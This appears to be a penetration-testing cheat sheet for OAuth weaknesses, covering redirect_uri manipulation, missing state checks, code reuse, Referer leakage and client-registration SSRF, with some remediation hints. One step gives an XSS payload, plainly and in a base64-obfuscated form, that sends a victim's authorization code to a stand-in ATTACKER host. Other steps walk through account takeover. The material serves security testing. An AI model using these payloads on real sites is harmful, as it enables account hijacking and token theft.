# OAuth Weaknesses

## Check List



## Cheat Sheet



### Methodology

{% stepper %}
{% step %}
Target Areas on Websites

* Authorization endpoints: `/oauth/authorize`, `/authorize`, `/oauth2/authorize`
* Token endpoints: `/oauth/token`, `/token`, `/oauth2/token`
* Redirect/callback endpoints: `/callback`, `/signin-oidc`, `/oauth/callback`
* Client registration & developer console pages
* Metadata endpoints: `/.well-known/openid-configuration` or `/.well-known/oauth-authorization-server`
* SPA pages using fragment-based tokens (`#access_token=...`) or storing tokens in browser storage
* Pages generating external links or redirects (to check Referer leakage)


{% endstep %}

{% step %}
Identify endpoints accepting `redirect_uri`.
{% endstep %}

{% step %}
Use a controlled domain: `redirect_uri=https://proof.example.com`
{% endstep %}

{% step %}
Observe the HTTP 302 response and `Location` header.

{% hint style="info" %}
Malicious redirect; potential token or session theft if combined with other flaws.
{% endhint %}
{% endstep %}
{% endstepper %}

{% stepper %}
{% step %}
Missing or weak `state` validation allows an attacker to bind a malicious authorization code to a victim’s session.
{% endstep %}

{% step %}
Identify `state` parameter in `/authorize`.
{% endstep %}

{% step %}
Check how `state` is generated and stored.
{% endstep %}

{% step %}
Send a test request and observe whether the application validates `state`.
{% endstep %}
{% endstepper %}

{% stepper %}
{% step %}
Identify SPA pages using `#access_token` or `#id_token`.
{% endstep %}

{% step %}
Inspect outgoing links and referer headers.
{% endstep %}

{% step %}
Ensure no real tokens are logged.
{% endstep %}
{% endstepper %}

{% stepper %}
{% step %}
Clients may request scopes they are not allowed; if the server does not enforce restrictions, privilege escalation is possible.
{% endstep %}

{% step %}
Identify `scope` parameter in authorization requests.
{% endstep %}

{% step %}
Check server-side enforcement against client-allowed scopes.
{% endstep %}
{% endstepper %}

{% stepper %}
{% step %}
Turn ON the interception
{% endstep %}

{% step %}
Initiate the OAuth login proccess
{% endstep %}

{% step %}
In the last step replace your identification data with the victim id

```
POST /auth HTTP/1.1
Host : example.com
Content-Type : 133

{
    "email":"$EMAIL"
    "username":"$USER"
    "token":$TOKEN
}
```
{% endstep %}

{% step %}
Forward the modified request
{% endstep %}

{% step %}
Check if you are logged in as a victim

{% hint style="info" %}
The Authorization Code should be tight to only user started the OAuth process. Use Authorization Code Grant type, instead of Implicit Grant type. Use the [Authorization Code flow](https://auth0.com/docs/get-started/authentication-and-authorization-flow/authorization-code-flow-with-proof-key-for-code-exchange-pkce) with [PKCE](https://oauth.net/2/pkce/).
{% endhint %}
{% endstep %}
{% endstepper %}

{% stepper %}
{% step %}
Check if there is a CSRF protection and test it The attacker could hijack the victim's account by conducting a Cross-Site Request Forgery attack.
{% endstep %}

{% step %}
Log in to the Attackers Account&#x20;
{% endstep %}

{% step %}
Turn ON the interception.
{% endstep %}

{% step %}
initiate the proccess of Attaching the socail media account&#x20;
{% endstep %}

{% step %}
On the request with the linking code

* if it is a GET Request , then copy the whole URL
* if it is a POST request , generate a CSRF Poc using Burp Suite
{% endstep %}

{% step %}
After that drop this Request&#x20;
{% endstep %}

{% step %}
Logout&#x20;
{% endstep %}

{% step %}
Log in to the victims  account&#x20;
{% endstep %}

{% step %}
Open  the copied (in the 3rd step) URL or the generated CSRF Poc URL
{% endstep %}

{% step %}
Logout
{% endstep %}

{% step %}
Access the victim account using the social media account
{% endstep %}
{% endstepper %}

{% stepper %}
{% step %}


Browse to a 3rd party page from the URL with sensitive data. If the Authorization Code is reflected inside the Referer header while visiting the third-party site, it can be leaked by the  attacker and reused to hijack the victim's account like this :

```http
GET / HTTP/1.1
Host : $WEBSITE
Referer : https://$WEBSITE/oaut-linking?code=$TOEN
```
{% endstep %}
{% endstepper %}

{% stepper %}
{% step %}
Check if you can reuse the Authorization Code after a few time later In case of Authorization Code leakage, the attacker could reuse it to exchange it for Access Token and hijack the victim's account.
{% endstep %}

{% step %}
Complete an entrie OAuth process and save the authorization code
{% endstep %}

{% step %}
Complete the OAuth Flow again , but replace the authorization code with the one Saved From step 1&#x20;
{% endstep %}

{% step %}
Ensure that the OAuth process fails&#x20;

If Authorization Code is exchanged for an Access Token, invalidate the Authorization Code and not issue any more Access Token against it. For the [JWT tokens](https://auth0.com/docs/secure/tokens/access-tokens#jwt-access-tokens) use the Refresh Token mechanism to extend it.
{% endstep %}
{% endstepper %}

{% stepper %}
{% step %}
Turn ON the interception
{% endstep %}

{% step %}
Initiate the OAuth process
{% endstep %}

{% step %}
Send the request with the redirect\_uri parameter to the repeater

```http
EXAMPLE OF A REQUEST:
GET /OAuth/auth?client_id=asd&redirect_uri=https://target.com&response_type=code HTTP/1.1
Host: afine.com
```
{% endstep %}

{% step %}
Detect the Open Redirect vulnerability Simple Open Redirect - replace the redirect\_uri parameter with the domain under your control

```http
GET /OAuth/auth?client_id=1234&redirect_uri=https://afine.com HTTP/1.1
Host: afine.com
```
{% endstep %}

{% step %}
SECOND ORDER SSRF - start the HTTP Listener on ports 80 & 443 and repeat the SIMPLE OPEN REDIRECT.

* Check the collaborator if you get the HTTP interaction, for example:&#x20;

```http
GET /OAuth/auth-callback?code=0SwG-3tuLQ9y8GNv2lNYt0mzBTPLKxtzLdw HTTP/1.1
Host: afine.com
```
{% endstep %}

{% step %}
PATH BYPASS - manipulate path to access the same endpoint in different ways, together with Open Redirect

```http
EXAMPLES OF A REQUEST:
GET /OAuth/////?client_id=1234&redirect_uri=https://afine.com HTTP/1.1
GET /OAuth/./././?client_id=1234&redirect_uri=https://afine.com HTTP/1.1
GET /OAuth/./../auth?client_id=1234&redirect_uri=https://afine.com HTTP/1.1
```
{% endstep %}

{% step %}
PARAMETER POLLUTION - reuse the redirect\_uri parameter.

```http
EXAMPLES OF A REQUEST:
GET /OAuth/auth?client_id=1234&redirect_uri=https://target.com&redirect_uri=https://afine.com HTTP/1.1
```
{% endstep %}

{% step %}
REFERER BASED REDIRECTION - host the below script on your server, visit it, then use SSO.

```html
<html><a href="https://TARGET/login">click on this link</a></html>
```
{% endstep %}

{% step %}
&#x20; FUZZING OPEN REDIRECTION & SECOND ORDER SSRF Generate a payload list using crimson\_redirector.

* USAGE: crimson\_redirector.py whitelisted\_domain domain\_collab vps\_ip redirect\_parameter\_name
* EXAMPLE: crimson\_redirector.py whitelisted.com col.afine.com 123.123.123.123 redirect\_uri
{% endstep %}

{% step %}
Start the HTTP Listener on the VPS server.
{% endstep %}

{% step %}
Start the fuzzing the parameter value using Burp Suite.
{% endstep %}

{% step %}
Check the output of the Intruder for any suspicious responses.
{% endstep %}
{% endstepper %}

{% stepper %}
{% step %}
Redirect flow to the static endpoint on the same domain to break it.
{% endstep %}

{% step %}
The attacker could use the static endpoint within the application to break the execution flow. Then, prevent the application from consuming the single-use Authorization Code.Then, chain it with an XSS vulnerability found in any endpoint across the application to leak the Authorization Code.
{% endstep %}

{% step %}
Identify that the application allows redirecting the user to other paths on the same domain.
{% endstep %}

{% step %}
Try exploiting the XSS vulnerability on one of these endpoints.
{% endstep %}

{% step %}
If it does not work, search for a static endpoint (401.html) which should break the OAuth flow

```http
EXAMPLE OF A REQUEST:
GET /OAuth/auth?client_id=1234&redirect_uri=https://target.com/401.html HTTP/1.1
```
{% endstep %}

{% step %}
Use the XSS on the other endpoint with the below content, to break the flow and leak the access key:

```javascript
javascript:x=window.open("https://TARGET/callback?redirectUrl=https://TARGET/401.html");setTimeout(function() {document.location="http://ATTACKER/?c="+x.location;},5000);
```
{% endstep %}

{% step %}
Example of an XSS payload to exploit the issue: (Credits to [Dawid](https://github.com/mackeysec) from [AFINE](https://afine.pl/) for finding this)

```javascript
<img src=x onerror=location=atob`amF2YXNjcmlwdDp4PXdpbmRvdy5vcGVuKCJodHRwczovL1RBUkdFVC9jYWxsYmFjaz9yZWRpcmVjdFVybD1odHRwczovL1RBUkdFVC80MDEuaHRtbCIpO3NldFRpbWVvdXQoZnVuY3Rpb24oKXtkb2N1bWVudC5sb2NhdGlvbj0naHR0cDovL0FUVEFDS0VSLz9jPScreC5sb2NhdGlvbjt9LDUwMDApOw==`>
```
{% endstep %}

{% step %}
Require client applications to register a whitelist of valid <sub>redirect\_uris</sub>. Use strict byte-to-byte comparison to validate the URI. Allow complete and exact matches.
{% endstep %}
{% endstepper %}

{% stepper %}
{% step %}
Redirect flow to the endpoint on the same domain using path traversal. The attacker could use the vulnerability on the other endpoint within the application and the new path as a proxy page to steal a victim's Access Token, thus hijacking his account.
{% endstep %}

{% step %}
Turn ON the interception.
{% endstep %}

{% step %}
Initiate the OAuth process.
{% endstep %}

{% step %}
Send the request with the <sub>redirect\_uri</sub> parameter to the repeater.

```http
EXAMPLE OF A REQUEST:
GET /OAuth/auth?client_id=1234&redirect_uri=https://target.com/callback HTTP/1.1
Host: afine.com
```
{% endstep %}

{% step %}
Change the path using PATH TRAVERSAL to redirect the flow to another endpoint

```http
EXAMPLE OF A REQUEST:
GET /OAuth/auth?client_id=1234&redirect_uri=https://target.com/callback/../vuln HTTP/1.1
```
{% endstep %}

{% step %}
If it is possible to redirect the user to another endpoint (/vuln), there is a vulnerability FUZZING PATH TRAVERSAL Check the other PATH TRAVERSAL bypasses using the TRAVERSAL\_DIR\_ONLY wordlist.
{% endstep %}
{% endstepper %}

{% stepper %}
{% step %}
Check if it is possible to register your client application. Discover the OpenID client registration endpoint: Using the configuration file <sub>/.well-known/openid-configuration</sub> By the directory brute-forcing (dir\_wordlist)
{% endstep %}

{% step %}
Fuzz the POST body to find proper parameters - a good start is to use just:

```json
EXAMPLE OF A VALID POST REQUEST:
POST /client_register HTTP/1.1
Host: oauth.afine.com
Content-Type: application/json

{"redirect_uris": ["https://WHITELISTED.COM/callback"]}
```
{% endstep %}

{% step %}
If you get the 200 OK response with a <sub>CLIENT\_ID</sub> in the body, it is likely vulnerable.&#x20;

> The OpenID provider should require the client application to authenticate itself. For instance, use an HTTP bearer token.
{% endstep %}
{% endstepper %}

{% stepper %}
{% step %}
Find the OpenID registration endpoint and check for SSRF.&#x20;

```json
EXAMPLE OF A VALID POST REQUEST:
POST /client_register HTTP/1.1
Host: oauth.afine.com
Content-Type: application/json
{"redirect_uris": ["https://WHITELISTED.COM/callback"]}
```
{% endstep %}

{% step %}
Use a private collaborator in place of the WHITELISTED.COM domain to check for SSRF vulnerability.&#x20;
{% endstep %}

{% step %}
Fuzz the POST body to discover more URI parameters (see the PortSwigger example below)
{% endstep %}

{% step %}
Fuzz the URI parameters values using SSRF wordlist and the one generated with crimson\_redirector.py.
{% endstep %}

{% step %}
After discovering <sub>UNVERIFIED CLIENT REGISTRATION</sub>, inject domain collaborator in every URI-like parameter value.

```http
POST /client_register HTTP/1.1
Host: target
Content-Type: application/json
{
  "redirect_uris": ["https://TARGET/callback"],
  "jwks_uri": "https://jwks.afine.com/my_public_keys_jwks",
  "logo_uri": "https://logo.afine.com/logo.png"
}
```
{% endstep %}

{% step %}
Find a way to trigger the server somehow to use these URLs.
{% endstep %}

{% step %}
One way is to use the <sub>CLIENT\_ID</sub> parameter value from the server response after registering the client.
{% endstep %}

{% step %}
Find the endpoint that fetches the logo (it should be one of the endpoints used during OAuth flow).
{% endstep %}

{% step %}
Use the <sub>CLIENT\_ID</sub> to trigger the server interaction.

```http
EXAMPLE REQUEST:
GET /client/CLIENT_ID/logo HTTP/1.1
```
{% endstep %}

{% step %}
Observe the <sub>DNS/HTTP</sub> out-of-bound interactions in your collaborator server
{% endstep %}
{% endstepper %}

{% stepper %}
{% step %}
OAuth Parameters


{% endstep %}
{% endstepper %}
